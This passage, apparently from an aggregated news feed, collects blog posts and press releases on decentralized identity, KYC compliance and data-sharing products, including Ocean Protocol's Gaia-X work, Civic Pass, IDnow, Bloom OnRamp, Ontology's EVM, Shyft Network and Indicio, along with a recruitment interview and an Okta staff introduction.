href="https://github.com/deltaDAO/Self-Description-Lifecycle-Management">basic lifecycle management tool</a> based on Ocean Protocol during the Hackathon.</p><p>Ocean’s Compute-to-Data</p><p>The Gaia-X Hackathon had a full stream dedicated to <a href="https://blog.oceanprotocol.com/ocean-protocol-launches-compute-to-data-efb89990ce1">Compute-to-Data</a>. A privacy-preserving data sharing and monetization approach to bring algorithms to the data instead of moving data&nbsp;around.</p><p>“Ocean Compute-to-Data is the response to solving the current tradeoff between the benefits of using private data and the risks of exposing it. Compute-to-Data lets data stay on-premise while allowing 3rd parties to run specific compute jobs on it, like building AI models. There are multitudes of applications in science, technology, and business contexts because the compute is sufficiently ‘aggregating’ or ‘anonymizing’ that the privacy risk is minimized,” explained Trent McConaghy, Ocean Protocol&nbsp;Founder.</p><p>“Ocean Compute-to-Data helps to make private data available for AI and business intelligence applications, while avoiding ‘data escapes’ and without the last-mile user seeing the private data directly,” remarks McConaghy. “It enables data marketplaces to buy and sell private data in a privacy-preserving fashion, for applications in healthcare, mobility, and more. We see Compute-to-Data as a new opportunity for companies to monetize and unlock their data&nbsp;assets.”</p><p>Compute-to-Data was the foundation for many third-party portals and industry use&nbsp;cases:</p><p>Third-party portals and industry use&nbsp;cases</p><p>deltaDAO created a satellite image service portal, enabling data monetization with Compute-to-Data. It allows running remote machine learning algorithms, generating insights and value on large Copernicus image datasets. The showcase uses open-source satellite images from Sentinel-1 SLC IW and Sentinel 2 L2A missions over the metropolitan area around Marseille, France. It provides insights into how resource-intensive machine learning algorithms can be applied to open-source data. Datasets and algorithms are available <a href="https://portal.minimal-gaia-x.eu/asset/did:op:9276BA792584245Df7f76A0cD96aBfB7dcFFC3bA">here</a>.</p><p>Not moving the data around enables new business models for the data owner, saving immense amounts of storage and bandwidth.</p><p>In addition, another demonstrator portal was created to showcase how machine learning can be used to <a href="https://portal.minimal-gaia-x.eu/asset/did:op:5F9217E8E3c7405C9D296aD63c0933cF5980F704">predict heat demand in data centers</a> depending on the weather. For training the ML model, historical heat demand data from data centers as well as the historical weather data from the location were used. This resulted in weather forecast data insights that could predict the future heat demand of the given data center location. The operator of the data center could then, for example, use this to optimize their infrastructure accordingly.</p><p>This demonstrator highlighted how different data sources can be combined to generate insights that can be used e.g. to save energy and run more efficient cloud&nbsp;systems.</p><p>Ocean Protocol tech stack &amp;&nbsp;Gaia-X</p><p>Ocean Protocol’s mission is to kickstart a Web3 Data Economy that reaches the world, giving power back to data owners and enabling people to capture value from data to better our&nbsp;world.</p><p>Ocean Protocol already supports a wide range of functionalities that the Gaia-X federated services (GXFS) aim to provide. It also works well with Self-Sovereign Identities (SSI) and Verifiable Credentials (VC). Ocean Protocol might allow the Gaia-X community and emerging European data economy to save years of development and integration time. The created Minimal Gaia-X (MVG) was one of the first steps to prove this&nbsp;claim.</p><p>The Ocean Protocol tech stack provides Gaia-X with the tools to build a decentralized network, completely open, transparent, interoperable, with no lock-in, and conformity and trust checked automatically.</p><p>1. Identity and Trust. Ocean Protocol relies on Self-Sovereign Identities (SSI) and works well with verifiable credentials (VC). It allows users to retain control of their identity and adds a new level of trust and security.</p><p>2. Federated Catalogue. Ocean Protocol metadata smart contracts provide a decentralized database and “ground truth” for all data asset self-descriptions. This includes a fully operational federated catalogue (FC) and inter-cataloguesynchronization on the application layer.</p><p>3. Sovereign Data Exchange. Ocean Protocol enables Data Contract Services (DCS) based on Smart Contracts. It enables providers and consumers to offer, negotiate and stipulate data contracts and execute data access rights transparently and securely. Compute-to-Data (CtD), as part of Ocean Protocol’s core features, allows data service providers to monetize their data while keeping ownership and&nbsp;control.</p><p>4. Data Exchange Logging. Using Blockchain, all transactions are verified, stored, and audited in an ordered, transparent, and trustless way, thus enabling the Data Exchange Logging Service&nbsp;(DELS).</p><p>5. Portal and Integration. A user-friendly tool to discover and interact with data assets allows for widespread adoption and acceptance of Gaia-X services. Ocean Protocol delivers an open-source, customizable web frontend and APIs to interact with it. Users can start publishing and consuming data services with not much more than a standard browser at their disposal.</p><p>6. Security and Privacy by Design. Ocean Protocol features security and privacy by design based on a trustless environment and SSI as a Blockchain application and protocol. It does not collect any more information about the participants than is needed to facilitate its services.</p> Towards a New Data&nbsp;Economy <p>Simplifying privacy compliance for organizations. Data ownership remains in the hands of the owners while enabling value creation. It makes any process involving private data compliant with the most restrictive data protection frameworks.</p><p>Creating new revenue streams. No matter how much and what kind, anyone who owns data can earn revenue by granting access to those willing to pay. This applies to individuals and organizations.</p><p>Unlocking data taps. The ability to monetize data introduces an incentive to share data. This increases the amount of data breaking free from silos, ready to be blended and transformed to create&nbsp;value.</p><p>Making data available. With more data available for Data and AI Scientists, data models will get more accurate, increasing the market value of data products. The ability to easily search and find data from a global corpus removes barriers and friction to match data supply and&nbsp;demand.</p><p>Liberalizing data workflows. With data and data services organized in markets, data science workflows can be redesigned from scratch. Market actors will be able to compete and collaborate on each activity in the value&nbsp;chain.</p><p>Seeding the New Data Economy. Data markets will be 100% liquified. While it is difficult to describe how the New Data Economy will behave, moving from an archaic ownership model to a completely liberalized economy is expected to drive disruption. The wave of change coming to data science and AI with the adoption of distributed ledger technology is likely to be as big as the one that came with the adoption of the internet.</p> Conclusion: Keep&nbsp;Building <p>“Having joined the Gaia-X AISBL recently, we at deltaDAO are excited to continue working towards a decentralized, self-sovereign, and privacy-preserving European Data Economy together.“, Kai Meinke, Business Lead at deltaDAO&nbsp;AG.</p><p>By embracing a collaborative, open, and transparent structure, Gaia-X actively asks for more contributors to build a European data infrastructure. Gaia-X is delivering — save the date for the second Gaia-X Summit in November!</p><p>If you want to integrate your use-case or application into the upcoming Gaia-X Hackathon in early December 2021, please <a href="mailto:contact@delta-dao.com">contact our partners at deltaDAO</a>.</p> <p><a href="https://blog.oceanprotocol.com/building-towards-a-decentralized-european-data-economy-a-minimal-viable-gaia-x-mvg-powered-by-43a853101d">Building towards a decentralized European Data Economy: A Minimal Viable Gaia-X (MVG) powered by…</a> was originally published in <a href="https://blog.oceanprotocol.com">Ocean Protocol</a> on Medium, where people are continuing the conversation by highlighting and responding to this story.</p>

<p>Since our earliest days, we’ve been working on identity for credential verification, based on the open-source platform, Identity.com. The identity solutions that we’ve built since are diverse – everything from establishing your age, so that you can <a href="https://www.civic.com/blog/black-fire-innovation-age-verification-vending-machine/">get a beer out of a vending machine</a>, to facilitating KYC for DeFi applications. Most recently, we collaborated with <a href="https://solrise.finance/">Solrise Finance</a> on the launch of <a href="http://dex.solrise.finance/">Solrise Dex Pro</a>, the first permissioned DEX built on Solana, using a new product from Civic, called <a href="https://www.civic.com/solutions/civic-pass/">Civic Pass</a>.</p>



<p>Civic Developer Resources</p>



<p>Now, we’re making <a href="https://docs.civic.com/">Civic Pass available to developers everywhere</a>. The idea is that developers can plug Civic Pass into their platform and create an identity layer that allows for a permissioned dApp platform, be it a DEX, an NFT marketplace or mint, a metaverse, or who knows what else you’ll come up with.&nbsp;</p>



<p>Done thoughtfully, identity verification will drive a more trusted web3 ecosystem. For example, the way DEXs are currently designed and used locks out institutional players. These larger entities, which have the ability to bring a lot of liquidity to the market, cannot use DEXs due to counterparty risk. They need to meet regulatory requirements in order to keep their licenses.&nbsp;</p>



<p>Specifically, institutional players must not interact with individuals or organizations that are sanctioned from using regulated financial institutions or platforms. Failure to comply with Anti-Money Laundering, Counter Terrorism Financing regulations and other sanctions could result in prison time for individuals and colossal fines for participating firms.&nbsp;</p>



<p>We believe that this permissioning can and should be done on-chain and that it should be done in a privacy-first and privacy-focused way. Ultimately, it should be in the power of the individual user to share their identity or not, and they should do so only if they want to access tools and financial services that are really interesting to them. Our point of view is that composable identity on-chain is the next evolution of what is required to enable a web3 structure, whether it’s a DEX, AMM, NFT marketplace or lending protocol.</p>



<p>Civic Pass is our answer to this problem. With Civic Pass, many different identity elements may be permissioned. So, if for example, a lending protocol has different needs, or if a dApp in another country has a lower threshold for KYC requirements, these components may be configured as needed. Regulations are inevitable, and we need to ensure that the right systems are in place so that these nascent companies can quickly and painlessly adapt as regulations change.</p>



<p>Getting Started is Easy</p>



<p>Visit our <a href="https://docs.civic.com/">Developer Resources</a> and reach out to us once you are ready to start integrating. Our tools aim to make a permissioned identity layer more accessible to dApps. The guide outlines integration with projects built on Solana, but support for other chains is coming soon.&nbsp;</p>



<p>We’re Here to Support You&nbsp;</p>



<p>While we’re a small but mighty team, we’re committed to helping you integrate with Civic Pass. You can find us in the #dev channel on our <a href="https://discord.gg/FCTHTBwj5Z">Discord server</a>, and we’d love to answer your questions.</p>



<p>We look forward to seeing what you build and hope this guide helps to better understand the potential implementations and possible innovations that Civic Pass can offer to your dApps.</p>

<p>Federal Network Agency confirms IDnow AutoIdent as official identification method</p>
<p>Munich, October 14th 2021, the AutoIdent solution from IDnow, a leading platform-as-a-service specialist for identity verification, is listed with the German Federal Network Agency as an officially confirmed identification method. Following VideoIdent, the AI-supported, automated method for identity verification, has thus now also received official proof that it meets the applicable requirements of eIDAS, the VGV and the VDV.</p>
<p>Following the upcoming amendments to the German Telecommunications Act (TKG), this means that IDnow can then also provide telecommunications service providers with an automated identification process.</p>
<p>The official confirmation means that AutoIdent (as defined in Article 24 (1) litera d) of the eIDAS) brings with it the determination of equivalent security, in terms of reliability compared to personal presence. Thus, the IDnow Group is the only German provider with a total of six identification procedures confirmed by the Federal Network Agency.</p>
<p>“The confirmation by the Federal Network Agency that our AI-based solution, AutoIdent, complies with the applicable regulations can be a breakthrough for many companies, especially for the future of digitalization in Germany,” says Armin Bauer, Managing Director Technology and Co-Founder at IDnow. “Automated identification procedures ensure seamless processes without media disruption and increase cost efficiency. By modernizing laws that allow these procedures, many cases can be simplified and modernized in the future.”</p>
<p>This is an important step especially in view of the amendment to the Telecommunications Act (TKG) in December. The modernization of the TKG to implement the European Electronic Communications Code (EU Directive 2018/1972) implements adjustments in the areas of digital infrastructure expansion, consumer protection and public safety.</p>
<p>Furthermore, there is an innovation for identity verification. Until now, only methods involving human interaction, such as postal or video ID procedures, were permitted. The new TKG amendment, §171 (2), now also includes procedures that have been accredited by the Federal Network Agency through a conformity assessment body. A draft of a new order of the Federal Network Agency on identification procedures pursuant to §172 (2) sentence 3 TKG published on October 13, 2021, supplements this innovation by clearly including automatic video identification as a possible identification procedure within the scope of the requirements regulated in the order. For telecommunications providers, this brings great advantages, as they can also use confirmed AI-based solutions. These enable a seamless on-boarding process, which can be done without disruption. This not only leads to a significantly higher conversion rate but also reduces costs through the automated process.</p>

<p><br>We’re thrilled to launch Bloom OnRamp, a new enterprise product that unlocks the full potential of DeFi, establishing a key piece of the infrastructure that will help the DeFi sector achieve compliance and, in turn, attain truly global and mainstream status. <br></p><p>Defi has experienced <a href="https://www.coindesk.com/markets/2021/04/29/defi-is-now-a-100b-sector/">massive growth</a> over the past year, topping both 1 million users and $100 billion in value for the first time. But this growth brings with it unforeseen challenges and limitations. Over the past month, regulators have <a href="https://www.wsj.com/articles/cryptos-defi-projects-arent-immune-to-regulation-secs-gensler-says-11629365401">warned</a> that a new wave of regulations was imminent as few DeFi companies have achieved compliance with KYC/AML and other applicable rules. <br></p><p>With the threat of regulations on the horizon, there is an opportunity in the DeFi space for projects to address compliance, risk assessment, and privacy in a new and more secure way<br></p><p>With OnRamp, enterprises can securely access reusable, verifiable credentials (VCs), all without requiring users to expose sensitive data. <br></p><p>For enterprises seeking KYC &amp; AML compliance, OnRamp offers ID verification, sanction screening and PEP Screening. Other identity credentials include phone number, email as well as social accounts like Facebook, Google, Linkedin and Twitter. <br></p><p>For enterprises seeking alternative data and better risk assessment, OnRamp offers secure access to bank account activity, balances and other financial signals. Future plans include the integration of traditional credit scores, utility bill payment history, and other alternative signals that could be helpful in determining creditworthiness.<br></p><p><br>Beyond OnRamp’s direct data integrations, the platform also supports the ability for third party credentials to enter the OnRamp platform via the WACI specification. This feature can enable unique localized use cases where financial infrastructure isn’t supporting local populations.<br></p><p>“We are excited to give enterprises the ability to leverage verifiable credentials for identity verification and risk assessment, all while respecting user privacy and mitigating the risk of data leaks” said Jace Hensley, Head of Platform at Bloom. “But what we are even more excited about is what our WACI integration enables. Now third party data sources around the world can enter the platform, giving the opportunity for people outside of the standard financial system to prove reliability and creditworthiness. This is a major step for DeFi to go global and truly expand financial inclusivity.”<br></p><p>Bloom’s <a href="https://onramp.co/">OnRamp</a> will be a key piece of infrastructure for DeFi companies, whether they are in launch or growth mode. The developer-friendly application includes no integration fees, no monthly minimums, no long term contracts, and flexible pricing. OnRamp reduces the barrier to entry for new builders, allows growing companies to expand, and most importantly, opens the door a bit wider for those who deserve access to the decentralized finance markets.<br></p><p>Learn how Bloom is helping DeFi with compliance and growing beyond collateralized lending, all while prioritizing user privacy.<br><br></p>

 A primer on Virtual Machines and Ontology’s Ethereum Virtual&nbsp;Machine. <p>As we move towards Web3, the next iteration of the internet, there has been a lot of talk about the benefits of interoperability and the need to connect different ecosystems and blockchains that currently operate in silos. Virtual Machines (VMs) are playing a big role in this. Haven’t heard of them? Never fear! We recently did a <a href="https://twitter.com/OntologyNetwork/status/1443893453495078934">tweet series</a> explaining their benefits, specifically related to Ethereum Virtual Machines. Check out the post below for a full&nbsp;recap!</p><p>A VM is a computer that runs on the blockchain and allows smart contracts from multiple sources to interact with one another. A smart contract is simply an agreement, expressed as code, executed on the blockchain, and the language it uses is blockchain platform-specific. To run smart contracts on different blockchain platforms, we need VMs to allow smart contracts written in one language to run another blockchain which saves time and costs compared to rewriting and testing new smart contracts or even requiring developers to learn a new programming language.</p><p>Imagine you’re a decentralized application (dApp) developer who has just launched an app on a leading public blockchain platform after months of research and coding. The number of users has skyrocketed since the dApp’s launch. Instead of becoming complacent, you begin to think about what’s next. You might consider moving the dApp to another blockchain platform to explore new opportunities and grow your user base. That’s where VMs come in. They help developers to instantly integrate their dApps into different platforms with a programming language they are already familiar with. By giving developers access to networks, VMs facilitate decentralized ecosystems and give them more computing power. Developers can then leverage the networks they are connected to to create smart contracts and&nbsp;dApps.</p><p>Ontology already has its own VM, and also supports Wasm and NeoVM. This summer, we <a href="https://medium.com/ontologynetwork/mainnet-3rd-anniversary-special-ontologys-ethereum-virtual-machine-evm-debut-f92111436a8e">announced</a> that we had completed the development of our Ethereum Virtual Machine (EVM). The EVM is the most popular and widely used VM, supporting a huge variety of&nbsp;dApps.</p><p>Ontology’s EVM will bring many benefits to users&nbsp;by:</p>  Increasing interoperability between Ontology and Ethereum; developers will be able to seamlessly migrate assets between both blockchains.  Allowing users to access EVM-based projects deployed on Ontology, whilst enjoying lower gas fees and faster block production.  Enabling Ethereum developers to build using Ontology’s decentralized identity and data protocols.  Increase Ontology’s functionality by adding an Ethereum account system, Ethereum transaction types, and Web3&nbsp;APIs.  <p>Our EVM recently launched on TestNet and opened its EVM-compatible public beta for developers. To help refine our TestNet, we set up a <a href="https://medium.com/ontologynetwork/ontologys-evm-testnet-officially-deployed-now-opening-evm-compatible-public-beta-to-developers-6dddc2bdd764">bug bounty</a> with Slow Mist, which allows people to earn rewards for identifying vulnerabilities, with a top prize of $12,000 of&nbsp;$ONG.</p><p>In addition to Ontology’s EVM TestNet, the Ontology Blockchain Explorer, Developer Documentation Center, and Ontology EVM-supported Web3 API are also being upgraded, which will incentivize Ethereum developers to deploy dApps on the TestNet. Developers can also use the Ontology Bridge to convert Ontology’s native OEP4 tokens to ORC20 tokens and add them to their MetaMask wallets and then deploy&nbsp;dApps.</p><p>We hope you’re excited for the full launch of our EVM and we look forward to sharing more updates. For now, if you’re interested in learning more about our EVM development, you can check out our Medium series: “<a href="https://medium.com/ontologynetwork/everything-you-need-to-know-about-ontology-evm-contract-development-part-1-network-details-2095f6e141e5">Everything You Need To Know About Ontology EVM Contract Development</a>”.</p> Want more Ontology? <p>Learn more about our decentralized data and identity solutions on our <a href="https://ont.io/">website</a> and official <a href="https://twitter.com/OntologyNetwork">Twitter</a> account.

  <p>by <a href="https://www.kuppingercole.com/team/suess">Fabian Süß</a></p><p>Robindro Ullah, CEO at Trendence Institut will discuss the <a href="https://www.kuppingercole.com/sessions/4914">The Impact of a Global Pandemic on Peoples Job Mindsets</a> on Wednesday, November 10 from 17:00 pm to 17:20 pm at <a href="https://www.kuppingercole.com/events/csls2021" title="Cybersecurity Leadership Summit 2021">Cybersecurity Leadership Summit 2021</a>.</p>
<p>To give you a sneak preview of what to expect, we asked Robindro some questions about his presentation.</p>
  
 Why has recruitment today never been so easy and hard at the same time? 
<p>This is a very good question, because on the one hand, we clearly see in our data, for example, that direct search or active sourcing was less used by companies, which is obviously because they have less job openings to fill. And, for example, also everything around the recruitment process was also easier to access, like video calls or virtual onboarding, and all that stuff. It didn't take so much time to do things like that, where in the past you had to travel to an employer to do an interview or a case study or something. Everything went online. So, talent was more accessible than before. On the other hand, the requirements of talent increased, like more people were looking for secure jobs or something we called job security. And another thing, for example, which was very prominent in Germany, was that more and more talents were looking for essential jobs, or at least they wanted to work in an essential environment. Like for example, we didn't ask the question before the pandemic, but during the past year, it was like every second person said that if they change or if they switch jobs, they will definitely look especially for essential jobs or jobs in an essential field.</p>
 How has the pandemic changed people's mindset about jobs in the last 1.5 years? 
<p>This is a difficult question. With our surveys and the data we are gathering we tried to look into the mindsets of people to get a clear picture of what they are thinking now. Obviously, as I said before, we have a shift in the direction of essential jobs or essential fields. So, till now, we are not 100 percent clear whether this is a shift which is based on more job security, because people think that an essential job is more secure, or is it because they thought about their life and the things they are doing and whether it is really something which matters, or is it essential for the society? And so, this could also be a reason why there's a shift in the direction of essential. In Germany especially, we also had, for example, a shift in the direction of government jobs or jobs in the public sector. This is also something which could be based on more job security, as well as on a shift in the mindset. In general, we can see that work/life balance or as we call it sometimes also work/life blending got more and more important during the pandemic and the focus on the family itself.</p>
 What distinguishes IT expert recruitment from the search of other professional fields? 
<p>This is a nice question, and a lot of our customers ask us how to approach IT experts, and is this completely different to all other searches they do or all other jobs that they have to fill? If you look at it from a more modern way of recruitment, you have to admit that every target group you are trying to access, you have to access individually. So, from this point of view of modern recruitment, IT experts, of course, they have to be approached individually, but it's not different from other target groups, because nowadays you have to approach every target group in a very individual way. What especially in the field of IT is harder or more difficult is the fact that they are approached a lot, like they get offers all the time, every day. So, you have to be more creative in comparison to other target groups, and you have to find other ways to approach them.</p>
<p>The highways to these talents, they are frequent. A lot of companies use those ways like LinkedIn or in in the German-speaking area, Xing. So, you have to be more creative and think about other ways to approach this talent. And of course, you have to consider the requirements they have. For example, in our data, we can clearly see that remote work has a different status or it has a different impact on this target group than on others. They have higher requirements on the topic of remote work. For example, companies who have rules like you can work two days a week from home, also after our crisis. So, in future, this is something which would not be enough for IT experts. Because IT experts, in general say at least it should be 3.5 days a week I can use remote work and not just two days.</p>
 Could you give us a sneak peek into your Keynote: “The impact of a global pandemic on people’s job mindsets”? 
<p>In my keynote, I want to present to you some of the data we collected during the last one and half years, what we did in the very beginning of this pandemic was that we started a monthly survey in Germany. And from this data, we got a lot of insights I want to present to you. Especially those insights which give a little bit of insight into the mindsets of the people. And for example, one insight I was very - not shocked, but surprised about, was the fact that, for example, the social media usage in terms of career and job search changed a little bit.</p>
<p>Before we had the big players who got a lot of traffic. And now more and more small players get more traffic, like very small networks in terms of career and job topics like TikTok, for example, came up in the professional area, which I've never seen before. TikTok is on the market from I think from 2015 on, or 2017 in the Western world too. So a lot changed due to the pandemic. And we have good reason to believe that. for example, one of the reasons is that people have more time. They were able to spend more time thinking about which social networks fit their needs best.</p>

  <p>Hello Oktaverse!</p>

<p>So finally, I have landed at Okta on my second attempt 😉. I’m so excited about this new chapter in my career journey and can’t wait to see what’s in store. But first, introductions.</p>

<p></p>

 Who am I 

<p>I’m from the south of India, a village in Kerala to be specific, but I grew up in Chennai since my parents moved there looking for work when I was 12. I like to call myself a software engineer with a soldering iron. That’s because I never intended to be in the IT industry. I wanted to be an astronomer, but that didn’t work out, so I wanted to get into robotics. I got myself an engineering degree in electronics and electrical engineering to pursue that, but apparently, the universe had different plans.</p>

<p>The recession of 2008 hit, and robotics companies in India weren’t hiring much. To make ends meet and repay my student loan, I applied to one of the biggest software companies in India with little to no hope. The only software experience I’d had at that point was the data-structures class (which I flunked once and had to retake) and a little bit of dabbling with JS and PHP when I ran a personal blog about modifying motorbikes. Surprisingly, I made the cut. Hence, I began my journey into software engineering with a boot camp provided by Tata Consultancy Services (TCS). That is when I realized I was pretty good at programming and I passed out of the boot camp as the top performer! I still love learning about astronomy and astrophysics, among other science subjects, and still ride a motorcycle 😄. I also love Linux and you can read <a href="https://deepu.tech/the-state-of-linux-on-desktops/">my take on the state of Linux</a> if you are interested.</p>

 What I’ve done so far 

<p>Fast forward to 2021: I have more than a decade of experience wearing all sorts of hats in IT, working with a dozen languages and all sorts of tech. I’m a jack of all trades and master of some. At TCS, I spend 2011-2016 in Singapore working for its airline customers. I started out building Java web apps for enterprises, did a lot of JavaScript and UX engineering, built mobile apps, led some teams, managed projects, and finally was part of a pre-sales team proposing architectures, building prototypes, and so on. I was also the go-to JS person there. This is when I started getting into open source, discovered <a href="https://www.jhipster.tech/">JHipster</a>, and fell in love with it.</p>

<p>I now co-lead JHipster along with <a href="https://twitter.com/juliendubois">Julien Dubois</a> and <a href="https://twitter.com/pascalgrimaud">Pascal Grimaud</a>. While I don’t actively code that much for JHipster these days, somehow, I still hold the number two position in terms of contributions 😉. Fun fact: Okta was an early supporter of JHipster, and thanks to <a href="https://developer.okta.com/blog/authors/matt-raible/">Matt Raible</a>, Okta is now the platinum sponsor for JHipster.</p>

<p>In 2016, I moved to the Netherlands to join a DevOps startup and helped build an analytics product, developer tooling, and cloud and container integrations. I worked mainly with Java, TypeScript, and Golang. This is where my fascination for cloud and container tech began. I had been doing some advocacy all along for JHipster and DevOps by writing content, giving conference talks, meetups, and so on. In 2020, I officially became a paid Developer Advocate for Adyen, a unicorn in the fintech space.</p>

<p>As part of my open-source software endeavors, I continue contributing to Java and JS communities. Recently I got fascinated with Rust and built a Kubernetes dashboard in Rust, called <a href="https://kdash.cli.rs/">KDash</a>. I’m hoping to get more involved in the Rust community as well.</p>

 What I’ll be doing at Okta 

<p>As someone who has been following Okta closely for many years, it’s an honor to be here finally. Though I have dabbled in many things and was fortunate to work with a lot of different technologies, my expertise is still around Java, JS, Golang, Rust, and DevOps. I hope to use my skills to contribute to those communities as much as possible while making Okta a well-known name in the DevOps space. Stay tuned for more content, talks, and OSS contributions in those areas. While here, I also hope to improve the developer experience of using Okta products, especially in the DevOps space.</p>

  <p>Covid19 has laid bare just how far behind most governments are in digitising public administration and services for citizens. As countries around the world scramble to catch up, digital identity has emerged as one of the key building blocks. The approach, however, varies greatly. Most governments fall back on a default pattern characterised by centralised approaches and a narrow focus on the public sector only. Other countries especially in Europe and most notably Germany,&nbsp; are taking a different strategy and implementing user-centric, decentralised, self-sovereign digital identity with the goal of providing a holistic identity solution citizens can use everywhere and across borders. Join this talk with Sebastian Manhart, Advisor on Digital Identity to the German Chancellery (Angela Merkel´s Office), who will share what is happening in Germany and Europe, and why this could set the stage for digital identity globally.</p>				<br><br><a href="https://www.kuppingercole.com/watch/enterprise-blockchain-day-2021-10-13-manhart"></a>

 From early ID management systems to the birth of Blockchain, learn how Shyft Network is building the most secure future for trust and identity. <p>Identity has been a contentious point for humanity ever since we evolved societies. How are we sure that someone is who they say they are? Before the modern age, there were several ways ancient civilizations did identity verification. Unfortunately, the scope and viability of those methods went out the window during the information age — and even more so during the dawn of the internet, as human interaction started to become replaced by digital connection. The internet’s identity and trust problems weren’t much of an issue when it first saw use. Most people would use phone lines to dial into bulletin board systems. Phone lines were linked to addresses, which were tied to people living in the house. If someone had enough patience, they could locate who was dialing into their BBS. However, the internet has evolved since then, to put it lightly, and its identity problems have kept pace with&nbsp;it.</p> The Story of Trust&nbsp;Online <p>As more casual users started to take advantage of the internet with Web1.0, individual data would have to be batched out. As the rise of personal experience websites came onto the scene, the back end needed to know which user data it should show to the person sitting at the screen. Developers solved this by constructing credential systems. Usernames and passwords would be stored on databases (sometimes encrypted) and were handy enough to be carried across ecosystems. Unfortunately, when you have a centralized database of usernames and passwords, the attack vectors for obtaining access to them are trivial. In the early days of login authentication, many young users tested their skills attempting to break into these Web1.0 databases, and many succeeded.</p><p>These early, clunky user-password authentication efforts evolved into ID management systems run by large corporations with the rise of Web2.0. Now, users can log in with a single click, using the API to share their login verification with whatever website requests it. This approach made it easier for developers to onboard users since it had much less friction than forcing them to sign up for a new account. Users today have several dozen accounts already on sites they might only use once. The obvious drawback of this system is that you can be banned or restricted if you go against the data holders. As an added bonus, these companies routinely sell the data they collect from users to third parties for all sorts of purposes, usually without the user being aware of it. While we’d like to think these massive corporations are secure, the sheer amount of data leaks coming from businesses like Facebook shows that this is a vain&nbsp;hope.</p> The Evolution of Blockchain Trust <p>In 2008, Satoshi Nakamoto created Bitcoin intending to develop a trustless ecosystem for financial transactions. In essence, the Bitcoin blockchain is a conversation between two parties. The recipient asks, “Do you have the BTC I requested?” and the sender replies with a yes or a no, backed up by the blockchain’s record of their currently accessible funds. Bitcoin has its own problems, but the principle of a trustless network is sound, as has been evidenced by the widespread adoption of the world’s first cryptocurrency. Shyft Network seeks to take what Bitcoin developed and evolve it to the next level. But how do we intend to do&nbsp;that?</p> Shyft Into High&nbsp;Gear <p>A blockchain can bring about tangible change in the world. Shyft Network is doing so by providing users and third parties with a single decentralized method of verifying credentials. The Shyft ecosystem involves several stakeholders, each with their part to&nbsp;play.</p><p>Ø The Data Owners and Data Holders: Data owners are individuals or organizations that credentials refer to. They may or may not be trusted entities, but they can interact with Trust Anchors (Data Holders) to verify their identity or the validity of the data. In fact, any data can be contextualized via attestations and&nbsp;TAs.</p><p>Ø Trust Anchors (Attestors): These are trusted entities that collect data from issuers and holders. They verify the identities of these individuals or organizations and hold the data off-chain. If the data owner would like to pass that data to a third party, they wouldn’t need to pay a fee for transferring that validated data. However, third-parties, such as aggregators could potentially pay for that data before the data-owner’s consent.</p><p>Ø Data Consumers: These entities provide pre-approved app services which utilize trusted data. They’re responsible for requesting data from holders, reviewing attestations, and determining whether that data is&nbsp;usable.</p><p>Ø Validators (Nodes): Nodes perform much of the same work as on other blockchains — they validate the transactions and add them to the&nbsp;chain.</p><p>Ø Consent Framework: Today’s users have become used to companies hiding privacy data inside their setting’s menus. Shyft Network operates on a strict opt-in system that allows users to control who gets their&nbsp;data.</p><p>Ø Proof of Individual: How do you know that the sender probably has what they’re offering? With the Shyft Network, it’s a simple matter of verifying the blockchain address. With all data pertaining to an individual linked to this address, it’s impossible to spoof identities.</p> Reliability and Dependability <p>The Shyft Network aims to provide a method for users to share data with the companies they see fit. As an opt-in system, the data holder can deal with each request for their data individually. However, the Shyft Network offers more than just a method of verifying users. Some of the most current use cases have demonstrated the flexibility of the platform.</p><p>Ø Financial Action Task Force (FATF) Travel Rule Compliance: The FATF recently issued crypto-specific guidance recommending jurisdictions to require Virtual Asset Service Providers (or VASPs), (such as cryptocurrency exchanges) to provide sender and recipient data on request. Yet, at current, there exists no way to comply with the FATF guidance. By partnering with some of the world’s most trusted cryptocurrency exchanges, like Binance and Tether, the Shyft Network has helped design and implement a solution to this&nbsp;problem.</p><p>Ø Compliant Decentralized Finance: De-Fi has had regulators up in arms, trying to lock down much of the innovation within the space. Large liquidity providers, for example, cannot interact with the De-Fi space because of a lack of clarity from regulators’ perspectives. Shyft Network is a decentralized solution that considers these outdated or obsolete perspectives that regulators may have and combines it with a way for liquidity providers to verify themselves in a way that complies with the regulations.</p><p>Ø Government Digital Identity: Identity fraud is a real danger, but with a trustless verification system like Shyft, a seamless, single verification is all that any citizen or organization within a country needs. Through Shyft, governments have a platform to create Know-Your-Customer (KYC) systems that are seamless to interact with and provide easy verification for all users. With this seamless verification comes security, interoperability, and transparency. Data collected would be readily available to regulators and auditors within the confines of privacy&nbsp;rules.</p><p>All of these use cases only scratch the surface of what Shyft is capable of, especially as we roll out open-sourcing of <a href="https://veriscope.network/">Veriscope</a>, our latest and great DeFi compliance framework and smart-contract platform for VASPs to enable travel rule compliance. While we already have an idea of what can be done with our growing infrastructure, we’re excited to see how the evolution of the blockchain will bring about new and innovative approaches to personal verification within cyberspace. Stay&nbsp;tuned.</p><p>Shyft Network aggregates trust and contextualizes data to build an authentic reputation, identity, and creditability framework for individuals and enterprises.</p><blockquote>Join our <a href="https://www.shyft.network/signup?userType=network">Newsletter</a></blockquote><blockquote>Telegram (<a href="https://t.me/shyftnetwork">https://t.me/shyftnetwork</a>)</blockquote><blockquote>Follow us on Twitter (<a href="https://twitter.com/shyftnetwork">https://twitter.com/shyftnetwork</a>)</blockquote><blockquote>Check out our GitHub (<a href="https://github.com/ShyftNetwork">https://github.com/ShyftNetwork</a>)</blockquote><blockquote>Check out our website (<a href="https://www.shyft.network/">https://www.shyft.network</a>)</blockquote><blockquote>Check out our Discord (<a href="https://discord.gg/ZcBNW37t">https://discord.gg/ZcBNW37t</a>)</blockquote>

				 <p>A distributed ledger is a database that has copies distributed across a network of servers (nodes), all of which are updated simultaneously. A network like this is the foundation of decentralized identity, a way of generating robust trust and collaboration free of the security risks of centralized databases. We call the companies and organizations that support an Indicio Network node on a server that is under their control “Node Operators.”&nbsp;</p>
<p>&nbsp;</p>
<p>Recently we caught up with Paul Ashley, CTO and Co-CEO of Anonyome Labs, a current Node Operator of Indicio, to discuss their current projects, some goals for the future, and where they think decentralized identity is heading.</p> 
			  
				
				
				 <p>Tell us about Anonyome: how did it start, where did it start, and who makes up your team?</p>
<p>The goal of Anonyome Labs is to shift the control of personal information back to normal users.&nbsp;</p>
